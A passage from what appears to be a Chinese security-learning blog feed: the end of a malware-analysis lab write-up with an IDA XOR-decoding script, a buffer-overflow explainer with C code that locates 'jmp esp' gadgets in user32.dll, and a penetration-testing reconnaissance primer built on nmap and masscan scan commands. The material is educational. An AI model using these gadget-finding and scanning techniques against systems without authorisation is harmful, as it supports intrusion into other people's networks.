title="idc脚本对抗反汇编"></a>idc脚本对抗反汇编</h4><ol><li>使用脚本将多余机器码转换成0x90H,之后将main转换成函数</li></ol><p><img src="/2023/032812655/22.png" alt="22"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>程序初始化请求的URL是什么？(一个网站链接)</li></ul><p><img src="/2023/032812655/23.png" alt="23"></p><ul><li>User-Agent域是如何产生的？</li></ul><p><img src="/2023/032812655/24.png" alt="24"></p><p><img src="/2023/032812655/25.png" alt="25"></p><p><img src="/2023/032812655/26.png" alt="26"></p><ul><li>初始化请求时，程序在内存页中查找什么？</li></ul><p>由internetOpenUrlA向下查：</p><p><img src="/2023/032812655/27.png" alt="27"></p><ul><li>程序如何处理它从页中提取的信息？</li></ul><p><img src="/2023/032812655/29.png" alt="29"></p><p><img src="/2023/032812655/30.png" alt="30"></p><h3 id="恶意程序会给自己加上重重陷阱"><a href="#恶意程序会给自己加上重重陷阱" class="headerlink" title="恶意程序会给自己加上重重陷阱"></a>恶意程序会给自己加上重重陷阱</h3><p><strong>对抗反汇编技术和上面相同的不再详写</strong></p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h4><ul><li>恶意代码怎样被初始化调用？</li></ul><p><img src="/2023/032812655/31.png" alt="31"></p><p><img src="/2023/032812655/32.png" alt="32"></p><ul><li>恶意代码都做了什么？使用了什么URL？使用了什么文件名？</li></ul><p><img src="/2023/032812655/33.png" alt="33"></p><p><img src="/2023/032812655/34.png" alt="34"></p><p>4014F8地址处的函数调用403040和403010处的东西是为了解密，对4014F8处函数反汇编即为：</p><p><img src="/2023/032812655/35.png" alt="35"></p><p>从而编写idc脚本，解密</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;idc.idc></span></span><span class="token keyword">static</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">auto</span> ea <span class="token operator">=</span> <span class="token function">ScreenEA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span>i<span class="token punctuation">,</span>decoded_byte<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0x0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">0x50</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        b <span class="token operator">=</span> <span class="token function">Byte</span><span class="token punctuation">(</span>ea<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        decoded_byte <span class="token operator">=</span> b<span class="token operator">^</span><span class="token number">0x55</span><span class="token punctuation">;</span>        <span class="token function">PatchByte</span><span class="token punctuation">(</span>ea<span class="token operator">+</span>i<span class="token punctuation">,</span> decoded_byte<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>恶意程序后续处理</p><p><img src="/2023/032812655/36.png" alt="36"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络攻击与防范</title>
      <link href="/2023/032462972.html"/>
      <url>/2023/032462972.html</url>
      
        <content type="html"><![CDATA[<h2 id="缓冲区溢出分析"><a href="#缓冲区溢出分析" class="headerlink" title="缓冲区溢出分析"></a>缓冲区溢出分析</h2><p><strong>原理</strong></p><p>栈溢出就是不顾栈中分配的局部数据块大小，向该数据块写入了过多的数据，导致数据越界，结果覆盖了老的栈数据。 或者解释为 在长字符串中嵌入一段代码，并将过程的返回地址覆盖为这段代码的地址，这样当过程返回时，程序就转而开始执行这段自编的代码了.</p><p><strong>利用：</strong></p><p>将返回值改为一个有效地址，去执行我们想执行的，即为缓冲区漏洞利用。</p><p><strong>修复：</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jmp esp方法://使用mp esp指令,机器码是0xFFE4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>eg:在user32.dll中查找jmp esp的地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        BYTE <span class="token operator">*</span>ptr<span class="token punctuation">;</span>        <span class="token keyword">int</span> position<span class="token punctuation">;</span>        HINSTANCE handle<span class="token punctuation">;</span>        BOOL done_flag <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>        handle <span class="token operator">=</span> <span class="token function">LoadLibrary</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>handle<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"load dll error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ptr <span class="token operator">=</span> <span class="token punctuation">(</span>BYTE<span class="token operator">*</span><span class="token punctuation">)</span>handle<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">!</span>done_flag<span class="token punctuation">;</span> position<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>                try                <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>position<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0xFF</span> <span class="token operator">&amp;&amp;</span> ptr<span class="token punctuation">[</span>position<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0xE4</span><span class="token punctuation">)</span>                        <span class="token punctuation">&#123;</span>                                <span class="token keyword">int</span> address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr <span class="token operator">+</span> position<span class="token punctuation">;</span>                                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"OPCODE found at 0x%x\n"</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                        <span class="token keyword">int</span> address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ptr <span class="token operator">+</span> position<span class="token punctuation">;</span>                        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"END OF 0x%x\n"</span><span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">;</span>                        done_flag <span class="token operator">=</span> true<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>有很多种方法可以获取jmp esp，而且不同的系统这个地址可能是不同的，但是有些地址是跨系统的</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Web安全基础</title>
      <link href="/2023/012220963.html"/>
      <url>/2023/012220963.html</url>
      
        <content type="html"><![CDATA[<h2 id="docker使用"><a href="#docker使用" class="headerlink" title="docker使用"></a>docker使用</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">docker ps <span class="token comment">//查看开启容器情况</span>docker rm <span class="token operator">-</span><span class="token class-name type-declaration">f</span> $<span class="token punctuation">(</span>docker ps <span class="token operator">-</span>qa<span class="token punctuation">)</span> <span class="token comment">//删除所有已开启容器</span>docker exec <span class="token operator">-</span>it 容器编号 <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span class="token comment">//进入容器环境</span>bash <span class="token operator">-</span>i <span class="token comment">//容器快捷操作</span>find <span class="token operator">/</span> <span class="token operator">-</span>name 文件名 <span class="token comment">//查找指定文件路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p><strong>firefox</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">FoxyProxy<span class="token operator">//</span>代理插件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><h3 id="cookie-1"><a href="#cookie-1" class="headerlink" title="cookie"></a>cookie</h3><p>Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于 RFC2109 和 2965 中的都已废弃，最新取代的规范是 RFC6265。</p><h3 id="cookie技术简介"><a href="#cookie技术简介" class="headerlink" title="cookie技术简介"></a>cookie技术简介</h3><p>Cookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。Cookie 是由 Web 服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。</p><p>目前有些 Cookie 是临时的，有些则是持续的。临时的 Cookie 只在浏览器上保存一段规定的时间，一旦超过规定的时间，该 Cookie 就会被系统清除。</p><p>持续的 Cookie 则保存在用户的 Cookie 文件中，下一次用户返回时，仍然可以对它进行调用。在 Cookie 文件中保存 Cookie，有些用户担心 Cookie 中的用户信息被一些别有用心的人窃取，而造成一定的损害。其实，网站以外的用户无法跨过网站来获得 Cookie 信息。如果因为这种担心而屏蔽 Cookie，肯定会因此拒绝访问许多站点页面。因为，当今有许多 Web 站点开发人员使用 Cookie 技术，例如 Session 对象的使用就离不开 Cookie 的支持。</p><h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><h3 id="robots简介"><a href="#robots简介" class="headerlink" title="robots简介"></a>robots简介</h3><p>robots.txt文件是一个文本文件，使用任何一个常见的文本编辑器，比如Windows系统自带的Notepad，就可以创建和编辑它。robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</p><p>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。</p><p>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p><h3 id="robots功能"><a href="#robots功能" class="headerlink" title="robots功能"></a>robots功能</h3><p>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。</p><h2 id="信息收集1"><a href="#信息收集1" class="headerlink" title="信息收集1"></a>信息收集1</h2><p>信息收集——渗透测试的灵魂</p><p>为什么要信息收集？</p><p>有句话说“知己知彼，百战不殆”。最了解你的人往往都是你的对手。</p><p>当你所掌握到的信息比别人多且更详细的时候那么你就占据了先机，这一条不仅仅用于商业、战争、渗透测试中也适用。</p><p>信息收集的方向、究竟收集什么？</p><p>以 <a href="http://www.secdriver.com/">http://www.secdriver.com/</a> 这个网站为例，你知道这个网站是谁的(注册人/机构)吗？当查到了网站所属的机构是某个公司后，那你能找到这个公司旗下拥有的其它网站吗？你访问网站后发现他是某个机构的官网，那你能发现这个网站使用了什么编程语言，php还是jsp；使用了什么WEB容器，apache还是iis ; 网站的后台地址是什么；网站使用的服务器是windows还是linux，服务器的ip是什么, 这个ip上都开放了哪些端口?；这个网站是不是某一款流行的cms产品？。</p><p>带着这些问题，让我们开始今天的学习 ~~~</p><h3 id="1-域名信息查询"><a href="#1-域名信息查询" class="headerlink" title="1.域名信息查询"></a><strong>1.域名信息查询</strong></h3><h4 id="什么是域名？"><a href="#什么是域名？" class="headerlink" title="什么是域名？"></a><strong>什么是域名？</strong></h4><p><strong>域名</strong>（<strong>Domain Name</strong>），又称<strong>网域</strong>，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。</p><p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。</p><p>计算机是不认识域名的，域名只是为了方便人们记忆而进行创建的</p><p>域名解析示例：secdriver.com -&gt; DNS 服务器 114.114.114.114 -&gt; 47.94.98.63</p><p>域名ip查询：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> secdriver.com  <span class="token comment"># ping DNS解析</span><span class="token function">nslookup</span> secdriver.com  <span class="token comment"># nslookup DNS解析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/1.PNG" alt=" "></p><h4 id="域名级别"><a href="#域名级别" class="headerlink" title="域名级别"></a><strong>域名级别</strong></h4><p>域名可分为不同级别，包括顶级域名、二级域名等</p><h5 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a><strong>顶级域名</strong></h5><p><strong>国家顶级域名</strong>（national top-level domainnames，简称nTLDs），200多个国家都按照ISO3166国家代码分配了顶级域名，例如中国是 .cn，美国是 .us，日本是 .jp 等</p><p><strong>国际顶级域名</strong>（international top-level domain names，简称iTDs），例如表示工商企业的 .com，表示网络提供商的 .net，表示顶级标杆、个人的 .top，表示非盈利组织的.org等</p><h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a><strong>二级域名</strong></h5><p>二级域名是指顶级域名之下的域名，在国际顶级域名下，它是指域名注册人的网上名称，例如”.ibm”，”.yahoo”，”.microsoft”等；在国家顶级域名下，它是表示注册企业类别的符号</p><h5 id="三级域名"><a href="#三级域名" class="headerlink" title="三级域名"></a><strong>三级域名</strong></h5><p>三级域名用字母（a～z）、数字（0～9）和连接符（－）组成， 各级域名之间用实点（.）连接，三级域名的长度不能超过20个字符，域名长度有限，最多可注册63个字符，域名总长度不能超过253个字符</p><h4 id="什么是子域名？"><a href="#什么是子域名？" class="headerlink" title="什么是子域名？"></a><strong>什么是子域名？</strong></h4><p><strong>子域名</strong>（<strong>Subdomain</strong>）是在域名系统等级中，属于更高一层域的域。比如，mail.example.com和calendar.example.com是example.com的两个子域，而example.com则是顶级域 .com 的子域。</p><p>子域名示例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">主域名：secdriver.com子域名：www.secdriver.comedu.secdriver.commail.secdriver.comctf.secdriver.com<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="IP反查域名"><a href="#IP反查域名" class="headerlink" title="IP反查域名"></a><strong>IP反查域名</strong></h4><p>通过IP可以反查出绑定在该网站的域名，来发现更多资产</p><p>ip138: <a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p>webscan: <a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p>VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>微步在线：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><h4 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a><strong>Whois查询</strong></h4><p>whois指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱。知道目标的域名之后，我们要做的第一件事就是获取域名的whois信息，因为域名注册人可能是网站管理员，可以尝试社工、套路，查询是不是注册了其他域名扩大攻击范围。</p><h5 id="查询网站"><a href="#查询网站" class="headerlink" title="查询网站"></a><strong>查询网站</strong></h5><p>爱站工具网: <a href="https://whois.aizhan.com/">https://whois.aizhan.com</a></p><p>站长之家: <a href="http://whois.chinaz.com/">http://whois.chinaz.com</a></p><p>VirusTotal: <a href="https://www.virustotal.com/">https://www.virustotal.com</a></p><p>通过这些网站可以查询域名的相关信息，如域名服务商、域名拥有者，以及他们的邮箱、电话、地址等。</p><h5 id="kali工具"><a href="#kali工具" class="headerlink" title="kali工具"></a><strong>kali工具</strong></h5><p>whois 域名</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">whois www.secdriver.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ICP备案信息查询"><a href="#ICP备案信息查询" class="headerlink" title="ICP备案信息查询"></a><strong>ICP备案信息查询</strong></h4><p>网站备案是根据国家法律法规规定，需要网站的所有者向国家有关部门申请的备案，这是国家信息产业部对网站的一种管理，为了防止在网上从事非法的网站经营活动的发生。主要针对国内网站，如果网站搭建在其他国家，则不需要进行备案。</p><p>常用的网站有以下几个：</p><p>工业和信息化部政务服务平台：<a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></p><p>全国互联网安全管理平台：<a href="http://www.beian.gov.cn/portal/recordQuery">http://www.beian.gov.cn/portal/recordQuery</a></p><p>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></p><h4 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a><strong>子域名收集</strong></h4><p>假设我们的目标网络规模比较大，直接从主域入手显然是很不理智的，因为对于这种规模的目标，一般其主域都是重点防护区域，所以不如先进入目标的某个子域，然后再想办法迂回接近真正的目标。</p><h5 id="网站查询子域名"><a href="#网站查询子域名" class="headerlink" title="网站查询子域名"></a><strong>网站查询子域名</strong></h5><p>VirusTotal <a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p><p>fofa <a href="https://fofa.info/">https://fofa.info/</a></p><h5 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h5><p>Layer子域名挖掘机</p><p><img src="/2023/012220963/4.PNG" alt="4"></p><h3 id="2-端口信息"><a href="#2-端口信息" class="headerlink" title="2.端口信息"></a><strong>2.端口信息</strong></h3><p>计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口，计算机有0~65535，共计65536个端口。</p><p>端口作为服务器和客户端交互的接口，起着非常重要的作用。一些常见的端口标识出服务器开启了什么服务，比如3389端口开启，可以认为服务器系统为windows并且开启了远程服务的功能。所以，端口扫描在渗透测试中是非常重要的。</p><h4 id="插件探测"><a href="#插件探测" class="headerlink" title="插件探测"></a><strong>插件探测</strong></h4><h5 id="Fofa-Pro-view"><a href="#Fofa-Pro-view" class="headerlink" title="Fofa Pro view"></a><strong>Fofa Pro view</strong></h5><p><img src="/2023/012220963/5.png" alt="5"></p><h5 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a><strong>shodan</strong></h5><p><img src="/2023/012220963/6.png" alt="6"></p><h4 id="工具扫描-1"><a href="#工具扫描-1" class="headerlink" title="工具扫描"></a><strong>工具扫描</strong></h4><h5 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><p>nmap 是一款开源免费的针对大型网络的端口扫描工具，nmap可以检测目标主机是否在线、主机端口开放情况、检测主机运行的服务类型及版本信息、检测操作系统与设备类型等信息</p><p>nmap常用参数</p><p><img src="/2023/012220963/2.PNG" alt="2"></p><h6 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a><strong>基本使用</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap <span class="token number">192.168</span>.23.1  <span class="token comment"># Nmap 默认发送⼀个arp的ping数据包，来探测⽬标主机在1-10000范围内所开放的端⼝</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a><strong>主机发现</strong></h6><p>主机发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sP <span class="token number">192.168</span>.1.0/24  <span class="token comment"># 进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试端口扫描或者操作系统探测</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a><strong>操作系统识别</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -O <span class="token number">192.168</span>.23.1     <span class="token comment"># 操作系统版本探测</span>nmap -O --osscan-limit <span class="token number">192.168</span>.23.1  <span class="token comment"># 探测操作系统版本详细信息</span>nmap -O --osscan-guess <span class="token number">192.168</span>.23.1  <span class="token comment"># 猜测操作系统版本</span>nmap -A <span class="token number">192.168</span>.23.1     <span class="token comment"># 操作系统探测和服务版本探测等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a><strong>端口扫描</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sT <span class="token number">192.168</span>.23.1 -p <span class="token number">21,22</span>,23,53,80,135,443,445 <span class="token comment"># (默认) TCP全连接扫描,常见端口</span>nmap -sS <span class="token number">192.168</span>.23.1 -p <span class="token number">1</span>-3000 --open -vv  <span class="token comment"># (常用) 快速扫描 1-3000 范围端口,只显示开放端口信息</span>nmap -PN <span class="token number">192.168</span>.23.1 -p <span class="token number">1</span>-3000  <span class="token comment"># 不使用ping命令扫描</span>nmap -PR <span class="token number">192.168</span>.23.1 -p <span class="token number">1</span>-3000  <span class="token comment"># arp扫描，内网中局域网防火墙不拦截，速度很快</span>nmap -P0 <span class="token number">192.168</span>.23.1 -p <span class="token number">1</span>-3000  <span class="token comment"># 空闲扫描，不会留下记录</span>nmap -sV <span class="token number">192.168</span>.81.148 -p <span class="token number">3389,5985</span>,6588,999,21,80 -A  <span class="token comment"># 探测端口信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a><strong>格式化输出</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 使用 nmap 结果美化 model, 美化 nmap 输出的 xml 文档，使用-oX xxx.xml 或者 -oA xxx 可</span>将结果导出为 xml 格式<span class="token comment"># 端口信息探测 + 系统探测 + 基础扫描</span>nmap -sV -A <span class="token number">192.168</span>.23.1 -p <span class="token number">80,88</span>,135,139,443,445,903,1080,1688,3306,5357 -oA mysite<span class="token comment"># 格式化 xml 文档</span>xsltproc -o mysite.html mode.xsl mysite.xml<span class="token comment"># 使用浏览器打开 html 文档</span>firefox mysite.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a><strong>常见端口</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">80,89</span>,8000,9090,1433,1521,3306,5432,445,135,443,873,5984,6379,7001,7002,9200,9300,11211,27017,27018,50000,50070,50030,21,22,23,2601,3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><p>masscan 是 Kali 下集成的高效扫描器 , 速度非常快</p><p>masscan 常用参数</p><p><img src="/2023/012220963/3.PNG" alt="3"></p><h6 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a><strong>基本用法</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan <span class="token number">192.168</span>.23.1 -p <span class="token number">1</span>-3000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="枚举C段"><a href="#枚举C段" class="headerlink" title="枚举C段"></a><strong>枚举C段</strong></h6><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-sL 参数可以枚举网段masscan -sL <span class="token number">10.0</span>.0.0/24 <span class="token operator">></span> c段.txtmasscan -sL <span class="token number">10.0</span>.0.0/16 <span class="token operator">></span> b段.txtmasscan -sL <span class="token number">10.0</span>.0.0/8 <span class="token operator">></span> a段.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h6 id="端口御剑扫描"><a href="#端口御剑扫描" class="headerlink" title="端口御剑扫描"></a><strong>端口御剑扫描</strong></h6><h3 id="3-C段和旁站"><a href="#3-C段和旁站" class="headerlink" title="3.C段和旁站"></a><strong>3.C段和旁站</strong></h3><h4 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a><strong>旁站</strong></h4><p>旁注：同服务器不同站点的渗透方案</p><p>旁站指的是网站所在服务器上部署的其他网站，同IP网站，一个IP上布置了多个网站从同台服务器上的其他网站入手，获取到服务器权限，自然就获取到了目标网站的权限</p><h4 id="C段"><a href="#C段" class="headerlink" title="C段"></a><strong>C段</strong></h4><p><strong>C段</strong>：同网段不同服务器的渗透方案</p><p>C 段嗅探指的是拿下同一C段下的服务器，也就是说是D段1-255中的一台服务器，再通过内网横向移动获取你想要的服务器权限。</p><p>例如192.168.1.66 -&gt; 192.168.1.4 能够相互通讯可以控制该网段中的192.168.1.66，再通过内网横向移动来控制 192.168.1.4 </p><p>注意：一般情况下云服务器C段的IP都是相互独立的，这些服务器分属不同用户，没有渗透的必要</p><h5 id="在线查询网站"><a href="#在线查询网站" class="headerlink" title="在线查询网站"></a><strong>在线查询网站</strong></h5><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h5 id="工具扫描C段"><a href="#工具扫描C段" class="headerlink" title="工具扫描C段"></a><strong>工具扫描C段</strong></h5><p>一般可以扫描一些常见端口，来发现C段中在线的主机，比如</p><h5 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a><strong>nmap</strong></h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -A -vv <span class="token number">192.168</span>.23.1/24    <span class="token comment"># 很慢，慎用可以加-T参数</span>nmap -PR -vv <span class="token number">192.168</span>.23.1/24 -p <span class="token number">1</span>-1000,8000-9000 --open  <span class="token comment"># arp 扫描, 速度快</span>nmap -PN -vv <span class="token number">192.168</span>.23.1/24 -p <span class="token number">1</span>-1000 --open <span class="token comment"># 不使用ping扫描，能发现禁ping主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="masscan-1"><a href="#masscan-1" class="headerlink" title="masscan"></a><strong>masscan</strong></h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">masscan <span class="token number">192.168</span>.23.1/24 --ping   <span class="token comment"># icmp探测C段在线主机</span>masscan <span class="token number">192.168</span>.23.1/24 -p<span class="token number">21,22</span>,80,137,138,139,443,445,1433,1434,1521,3306,6379,7001,8000,8080,9001 --open-only<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="御剑端口扫描"><a href="#御剑端口扫描" class="headerlink" title="御剑端口扫描"></a><strong>御剑端口扫描</strong></h5><h2 id="信息收集2"><a href="#信息收集2" class="headerlink" title="信息收集2"></a>信息收集2</h2><p>补天SRC：<a href="https://www.butian.net/">https://www.butian.net/</a></p><p>公益SRC：<a href="https://www.butian.net/Reward/plan/2">https://www.butian.net/Reward/plan/2</a></p><h3 id="目录信息收集"><a href="#目录信息收集" class="headerlink" title="目录信息收集"></a>目录信息收集</h3><ul><li><p>寻找到网站后台管理</p></li><li><p>寻找未授权界面</p></li><li><p>寻找网站更多隐藏信息</p></li><li><p>发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构</p></li><li><p>发现敏感文件，后台文件，数据库文件，和信息泄漏文件等等</p></li></ul><h4 id="常见的后台管理页面："><a href="#常见的后台管理页面：" class="headerlink" title="常见的后台管理页面："></a>常见的后台管理页面：</h4><p><img src="/2023/012220963/7.PNG" alt="7"></p><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" 